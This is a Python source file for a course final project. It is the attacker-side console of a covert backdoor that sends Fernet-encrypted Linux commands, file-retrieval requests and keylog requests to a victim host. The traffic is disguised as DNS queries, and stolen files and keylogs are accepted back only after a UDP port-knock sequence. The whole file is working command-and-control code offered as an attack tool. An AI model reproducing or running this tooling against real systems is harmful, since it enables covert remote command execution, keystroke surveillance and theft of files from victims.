"""
Author: Braeden Nishikihama
Created: June 2023
COMP 8505 Final Project
Attacker Program
"""

import attacker_config
from cryptography.fernet import Fernet, InvalidToken
from scapy.sendrecv import sniff, send
from scapy.all import RandNum
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNS, DNSQR
import threading
import socket
import os
from datetime import datetime


CONSOLE_OUTPUT = """Attacker Machine Console - Types of Attacks:
(q) - Quit Program
(c) - Execute Command
(f) - Transfer File
(k) - Request Keylog
"""

CONTROL_PKT_NUM = 0
PKT_PAYLOADS = []
NUM_PORT_KNOCKS = 0
AUTHORIZED_CONN = []


# Read symmetric encryption key
try:
    with open(attacker_config.KEY, 'rb') as sym_key:
        key = sym_key.read()
    fernet = Fernet(key)
except FileNotFoundError:
    print("Encryption file could not be found. Exiting...")
    exit(0)


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
IP_SELF = s.getsockname()[0]
s.close()


def encrypt(plaintext):
    try:
        # Encrypt using preloaded key
        encrypted_string = fernet.encrypt(plaintext)
        return encrypted_string
    except InvalidToken:
        print("Error while encrypting, invalid plaintext. Exiting...")
        exit(0)


def decrypt(encrypted_string):
    try:
        # Decrypt using preloaded key
        plaintext = fernet.decrypt(encrypted_string)
        return plaintext
    except InvalidToken:
        print("Error while decrypting, invalid plaintext. Exiting...")
        exit(0)


def craft_packet(message, port=attacker_config.TARGET_PORT):
    try:
        pkt = IP(dst=attacker_config.TARGET_IP)
        if attacker_config.PROTOCOL["TCP"]:
            pkt = pkt / \
                  TCP(dport=port, sport=RandNum(5000, 65000)) / \
                  message
        elif attacker_config.PROTOCOL["UDP"]:
            if port == 53:
                pkt = pkt / \
                      UDP(dport=port, sport=RandNum(5000, 65000)) / \
                      DNS(qd=DNSQR(qname="www.mozilla.org")) / \
                      message
            else:
                pkt = pkt / \
                      UDP(dport=port, sport=RandNum(5000, 65000)) / \
                      message

        return pkt
    except OSError:
        print("Invalid IP Address. Exiting...")
        exit(0)


def send_command(command, type_of_command):
    message = attacker_config.COMMAND_START + str(type_of_command) + command + attacker_config.COMMAND_END
    # print(len(message) + len(attacker_config.IDENTIFIER))
    encrypted_message = attacker_config.IDENTIFIER + encrypt(message.encode())
    # print(encrypted_message)
    # print(len(encrypted_message))
    pkt = craft_packet(encrypted_message)
    send(pkt)


def console():
    # Interactive console for executing commands
    try:
        while True:
            # Reprint the command options
            print(CONSOLE_OUTPUT)
            console_command = input("Type Of Attack: ")
            if console_command == "q":
                print("Shutting down...")
                exit(0)
            elif console_command == "c":
                command = input("Linux Command: ")
                print(command)
                send_command(command, 0)
            elif console_command == "f":
                file = input("File to Retrieve: ")
                print(f"Retrieving File {file}")
                send_command(file, 1)
            elif console_command == "k":
                print("Requesting Keylog file")
                send_command("keylog", 2)
            else:
                print("Incorrect Type of Attack. Please Enter Correct Attack.\n")
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


def extract_pkt(payload):
    # Check if payload corrupted by finding identifier
    if payload[:len(attacker_config.IDENTIFIER)] != attacker_config.IDENTIFIER:
        print("Corrupted Return Payload")
        return

    # Decrypt payload to get command
    payload = decrypt(payload[len(attacker_config.IDENTIFIER):]).decode()
    # Check for payload integrity
    if attacker_config.COMMAND_START not in payload:
        print("Packet Corrupted")
        return
    if attacker_config.COMMAND_END not in payload:
        print("Packet Corrupted")
        return

    # Retrieve Command
    return_command = payload[len(attacker_config.COMMAND_START):-len(attacker_config.COMMAND_END)]
    command_type, command = int(return_command[:1]), return_command[1:]
    with open(attacker_config.OUTPUT_FILE, "w") as output_file:
        output_file.write(command)
    print("All Packets Retrieved Successfully.")


def pkt_handler(pkt):
    global CONTROL_PKT_NUM
    global PKT_PAYLOADS
    global NUM_PORT_KNOCKS
    global AUTHORIZED_CONN
    if not pkt.haslayer("IP"):
        return
    # Only look at packets with this machine as destination
    if pkt["IP"].src == IP_SELF:
        return
    if pkt["IP"].src == socket.gethostbyname(socket.gethostname()):
        return
    # Only look at packets from the victim machine
    if pkt["IP"].src != attacker_config.TARGET_IP:
        return

    # If incoming to port PORT_KNOCK_TARGET_PORT, verify port knock has occurred
    if pkt.haslayer("UDP"):
        if pkt["UDP"].dport == attacker_config.PORT_KNOCK_TARGET_PORT and pkt["IP"].src not in AUTHORIZED_CONN:
            return
        elif pkt["UDP"].dport == attacker_config.PORT_KNOCK_TARGET_PORT and pkt["IP"].src in AUTHORIZED_CONN:
            pass
    elif pkt.haslayer("TCP"):
        if pkt["TCP"].dport == attacker_config.PORT_KNOCK_TARGET_PORT and pkt["IP"].src not in AUTHORIZED_CONN:
            return
        elif pkt["TCP"].dport == attacker_config.PORT_KNOCK_TARGET_PORT and pkt["IP"].src in AUTHORIZED_CONN:
            pass

    if pkt.haslayer("UDP"):
        if pkt["UDP"].dport == 8505 and NUM_PORT_KNOCKS == 0:
            NUM_PORT_KNOCKS = 1
            print("First Port Knock Received")
            return
        elif pkt["UDP"].dport == 8506 and NUM_PORT_KNOCKS == 1:
            NUM_PORT_KNOCKS = 2
            print("Second Port Knock Received. Accepting Packets")
            AUTHORIZED_CONN.append(pkt["IP"].src)
            return

    # print(pkt.summary())
    if pkt.haslayer("UDP"):
        payload = pkt["UDP"].load
    elif pkt.haslayer("TCP"):
        payload = pkt["TCP"].load
    else:
        return

    # Handle Control Packet
    if pkt["IP"].id == 0:
        # Set number of data packets to read
        num_incoming_pkts = int(payload.decode())
        CONTROL_PKT_NUM = num_incoming_pkts
        # print(CONTROL_PKT_NUM)
        return
    if CONTROL_PKT_NUM == 0:
        return
    else:
        PKT_PAYLOADS.append(payload)
        if len(PKT_PAYLOADS) == CONTROL_PKT_NUM:
            # Combine all payload slices together
            complete_payload = b"".join(PKT_PAYLOADS)
            # Communication Complete. Wipe Globals
            CONTROL_PKT_NUM = 0
            PKT_PAYLOADS = []
            NUM_PORT_KNOCKS = 0
            AUTHORIZED_CONN = []
            extract_pkt(complete_payload)


def sniff_thread():
    try:
        sniff_filter = f"dst port 53 or dst port {attacker_config.PORT_KNOCK_TARGET_PORT} or dst port 8505 or dst port 8506"
        sniff(filter=sniff_filter, prn=pkt_handler, store=False)
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


def main():
    if attacker_config.PROTOCOL["UDP"]:
        print("UDP selected as Protocol")
    elif attacker_config.PROTOCOL["TCP"]:
        print("TCP selected as Protocol")
    else:
        print("No Protocol Selected. Exiting...")
        exit(0)
    # Start sniff thread
    threading.Thread(target=sniff_thread, daemon=True).start()
    # Run the Interactive Console
    console()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)
